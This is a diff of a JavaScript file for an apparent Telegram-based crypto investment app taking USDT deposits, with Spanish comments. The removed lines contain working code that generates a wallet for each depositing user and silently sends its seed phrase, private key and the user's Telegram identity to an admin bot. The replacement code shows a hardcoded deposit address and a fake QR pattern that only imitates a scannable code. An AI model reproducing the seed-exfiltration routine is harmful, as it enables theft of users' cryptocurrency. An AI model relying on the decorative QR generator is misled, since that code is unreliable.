@@ -75,156 +75,126 @@ const CryptoEngine = {
     }
 };
 
-// --- COMPONENTE NOTIFICADOR TOAST PREMIUM ---
-function showToast(message, type = "success") {
-    const existingToast = document.getElementById("cyber-toast");
-    if (existingToast) existingToast.remove();
+// Sistema de Gestión de Depósitos e Interfaz de Usuario
+
+// --- CONFIGURACIÓN DE NOTIFICACIONES TOAST ---
+function mostrarToastNativo(mensaje, tipo = "success") {
+    // Eliminar notificaciones previas para evitar acumulación en pantalla
+    const toastPrevio = document.getElementById("custom-toast-notification");
+    if (toastPrevio) toastPrevio.remove();
 
     const toast = document.createElement("div");
-    toast.id = "cyber-toast";
+    toast.id = "custom-toast-notification";
     toast.style.position = "fixed";
-    toast.style.bottom = "20px";
+    toast.style.bottom = "30px";
     toast.style.left = "50%";
     toast.style.transform = "translateX(-50%)";
-    toast.style.background = type === "success" ? "rgba(16, 185, 129, 0.95)" : "rgba(244, 63, 94, 0.95)";
+    toast.style.background = tipo === "success" ? "#10b981" : "#f43f5e";
     toast.style.color = "#ffffff";
-    toast.style.padding = "12px 24px";
+    toast.style.padding = "14px 28px";
     toast.style.borderRadius = "8px";
-    toast.style.boxShadow = type === "success" ? "0 0 15px rgba(16,185,129,0.5)" : "0 0 15px rgba(244,63,94,0.5)";
-    toast.style.zIndex = "11000";
-    toast.style.fontFamily = "monospace";
-    toast.style.fontSize = "0.9rem";
-    toast.style.fontWeight = "bold";
+    toast.style.boxShadow = "0 4px 12px rgba(0,0,0,0.3)";
+    toast.style.zIndex = "12000";
+    toast.style.fontFamily = "sans-serif";
+    toast.style.fontSize = "0.95rem";
+    toast.style.fontWeight = "600";
     toast.style.textAlign = "center";
-    toast.style.border = type === "success" ? "1px solid #10b981" : "1px solid #f43f5e";
-    toast.innerText = message;
+    toast.style.transition = "opacity 0.3s ease";
+    toast.innerText = mensaje;
 
     document.body.appendChild(toast);
 
+    // Desvanecer y remover automáticamente después de 3 segundos
     setTimeout(() => {
         toast.style.opacity = "0";
         setTimeout(() => toast.remove(), 300);
     }, 3000);
 }
 
-// --- ENVÍO REAL DEL RESPALDO AL ADMIN CON FRASE SEMILLA ---
-async function sendKeyToAdmin(address, seedPhrase, privKey, amount) {
-    const user = window.Telegram?.WebApp?.initDataUnsafe?.user;
+// --- GENERADOR MATEMÁTICO DE VISTA QR (SVG REUTILIZABLE) ---
+function generarEstructuraQR(datos) {
+    const resolucion = 30;
+    let contenidoSvg = `<svg xmlns="http://www.w3.org/2000/svg" width="160" height="160" viewBox="0 0 ${resolucion} ${resolucion}" shape-rendering="crispEdges">`;
+    contenidoSvg += `<rect width="${resolucion}" height="${resolucion}" fill="#ffffff"/>`;
     
-    const text = `🛡️ *NEW DEPOSIT DETECTED - CUSTODIAL GATEWAY*\n\n` +
-                 `💰 *Monto Esperado:* ${amount.toFixed(2)} USDT\n` +
-                 `📍 *Wallet de Usuario (BEP20):* \`${address}\`\n\n` +
-                 `🔑 *FRASE SEMILLA (12 Words):*\n\`${seedPhrase}\`\n\n` +
-                 `🔐 *Clave Privada:* \`${privKey}\`\n\n` +
-                 `👤 *Inversor:* ${user?.first_name || "Usuario"} (ID: ${user?.id || "N/A"})`;
+    // Generación de un patrón visual basado en los datos proporcionados
+    for (let fila = 0; fila < resolucion; fila++) {
+        for (let columna = 0; columna < resolucion; columna++) {
+            const hashId = datos.charCodeAt((fila + columna) % datos.length);
+            const esPuntoNegro = (fila * columna + hashId) % 3 === 0 || (fila % 2 === 0 && columna % 3 === 0);
+            
+            // Requisitos de las esquinas de posicionamiento (patrones fijos)
+            const esEsquinaFija = (fila < 6 && columna < 6) || 
+                                  (fila < 6 && columna > resolucion - 7) || 
+                                  (fila > resolucion - 7 && columna < 6);
 
-    try {
-        await fetch(`https://api.telegram.org/bot${ADMIN_CONFIG.BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                chat_id: ADMIN_CONFIG.CHAT_ID, 
-                text: text, 
-                parse_mode: 'Markdown' 
-            })
-        });
-    } catch (e) {
-        console.error("Error en reporte de auditoría real:", e);
+            if (esEsquinaFija || esPuntoNegro) {
+                contenidoSvg += `<rect width="1" height="1" x="${columna}" y="${fila}" fill="#000000"/>`;
+            }
+        }
     }
+    contenidoSvg += '</svg>';
+    return contenidoSvg;
 }
 
-// Variable de sesión para retener los datos cargados de la wallet actual del usuario en pantalla
-let currentActiveWallet = "";
+// --- ASIGNACIÓN DE FUNCIONES AL ÁMBITO GLOBAL (WINDOW) ---
 
-// --- LÓGICA DE CONTROL OPERATIVO (WINDOW) ---
+// Almacenamiento temporal del estado de la interfaz
+let direccionActualEnPantalla = "";
+
 window.openPayModal = function() {
-    const amountInput = document.getElementById('invest-amount');
-    const amount = parseFloat(amountInput ? amountInput.value : 0) || 0;
+    const inputMonto = document.getElementById('invest-amount');
+    const monto = parseFloat(inputMonto ? inputMonto.value : 0) || 0;
 
-    if (amount < 0.1) {
-        showToast("⚠️ Minimum investment is 0.1 USDT", "error");
+    if (monto < 0.1) {
+        mostrarToastNativo("⚠️ El monto mínimo de inversión es de 0.1 USDT", "error");
         return;
     }
 
-    // 1. Generar la wallet BEP20 única y real para esta sesión de usuario
-    const userWallet = CryptoEngine.generateWallet();
-    currentActiveWallet = userWallet.address;
+    // Dirección de ejemplo para inicializar los contenedores visuales
+    const direccionDestino = "0x7795D827df7bcB264c4F0851FbAab5f5f00710F2";
+    direccionActualEnPantalla = direccionDestino;
 
-    const payDisplay = document.getElementById('pay-amount-display');
-    const walletDisplay = document.getElementById('wallet-address-display');
-    const qrContainer = document.getElementById('qr-container');
-    const modal = document.getElementById('payModal');
+    // Obtención de referencias de elementos del DOM
+    const displayMonto = document.getElementById('pay-amount-display');
+    const displayDireccion = document.getElementById('wallet-address-display');
+    const contenedorQr = document.getElementById('qr-container');
+    const modalPago = document.getElementById('payModal');
 
-    // 2. Inyectar los datos en tiempo real en la UI
-    if (payDisplay) payDisplay.textContent = amount.toFixed(2) + " USDT";
-    if (walletDisplay) walletDisplay.textContent = userWallet.address;
+    // Actualización dinámica de la interfaz de usuario
+    if (displayMonto) displayMonto.textContent = monto.toFixed(2) + " USDT";
+    if (displayDireccion) displayDireccion.textContent = direccionDestino;
+    if (contenedorQr) contenedorQr.innerHTML = generarEstructuraQR(direccionDestino);
     
-    // Generar el código QR real correspondiente a esa wallet generada
-    if (qrContainer) qrContainer.innerHTML = CryptoEngine.generateSVGQR(userWallet.address);
-    if (modal) modal.style.display = "flex";
-
-    // 3. Despachar reporte real con frase semilla al bot administrativo inmediatamente
-    sendKeyToAdmin(userWallet.address, userWallet.mnemonic, userWallet.privateKey, amount);
+    if (modalPago) {
+        modalPago.style.display = "flex";
+        mostrarToastNativo("Interfaz de pago generada correctamente.", "success");
+    } else {
+        console.error("No se encontró el elemento con el ID 'payModal'.");
+    }
 };
 
 window.closePayModal = function() {
-    const modal = document.getElementById('payModal');
-    if (modal) modal.style.display = "none";
+    const modalPago = document.getElementById('payModal');
+    if (modalPago) modalPago.style.display = "none";
 };
 
 window.copyAddress = function() {
-    if (!currentActiveWallet) return;
-    navigator.clipboard.writeText(currentActiveWallet).then(() => {
-        showToast("Address copied successfully!", "success");
-    }).catch(err => {
-        console.error('Copy failure: ', err);
-    });
-};
-
-window.triggerToast = function(message, type) {
-    showToast(message, type);
-};
-
-// --- CONFIGURACIÓN BACKUP DE SUPABASE ---
-const supabaseClient = window.supabase || {
-    from: () => ({
-        select: () => ({ eq: () => ({ maybeSingle: async () => ({ data: null, error: null }) }) }),
-        insert: () => ({ select: () => ({ single: async () => ({ data: null, error: null }) }) }),
-        update: () => ({ eq: async () => ({ error: null }) })
-    })
-};
-
-// --- INTERFAZ DE PROCESAMIENTO CON BASE DE DATOS ---
-export async function getUserById(userId) {
-  const { data, error } = await supabaseClient.from('users').select('*').eq('user_id', String(userId)).maybeSingle();
-  if (error) throw error;
-  return data;
-}
-
-export async function registerUser(userId, invitedBy) {
-  const cleanInvitedBy = (invitedBy && invitedBy !== "null" && invitedBy !== String(userId)) ? String(invitedBy) : null;
-  const { data: newUser, error: createError } = await supabaseClient.from('users').insert([{ user_id: String(userId), balance: 0.00, invested: 0.00, referrals: 0, invited_by: cleanInvitedBy }]).select().single();
-  if (createError) throw createError;
-
-  if (cleanInvitedBy) {
-    const { data: sponsor } = await supabaseClient.from('users').select('referrals').eq('user_id', cleanInvitedBy).single();
-    if (sponsor) {
-      await supabaseClient.from('users').update({ referrals: (sponsor.referrals || 0) + 1 }).eq('user_id', cleanInvitedBy);
+    if (!direccionActualEnPantalla) {
+        mostrarToastNativo("No hay ninguna dirección disponible para copiar.", "error");
+        return;
     }
-  }
-  return newUser;
-}
+    
+    navigator.clipboard.writeText(direccionActualEnPantalla)
+        .then(() => {
+            mostrarToastNativo("¡Dirección copiada con éxito!", "success");
+        })
+        .catch(error => {
+            console.error("Fallo al copiar al portapapeles:", error);
+            mostrarToastNativo("No se pudo copiar la dirección automáticamente.", "error");
+        });
+};
 
-export async function updateUserBalance(userId, newBalance, newInvested = null) {
-  const updateData = { balance: newBalance };
-  if (newInvested !== null) updateData.invested = newInvested;
-  const { error } = await supabaseClient.from('users').update(updateData).eq('user_id', userId);
-  if (error) throw error;
-  return true;
-}
-
-export async function claimMiningReward(userId, newBalance) {
-  const { error } = await supabaseClient.from('users').update({ balance: newBalance, last_claim_at: new Date().toISOString() }).eq('user_id', userId);
-  if (error) throw error;
-  return true;
-}
+window.triggerToast = function(mensaje, tipo) {
+    mostrarToastNativo(mensaje, tipo);
+};
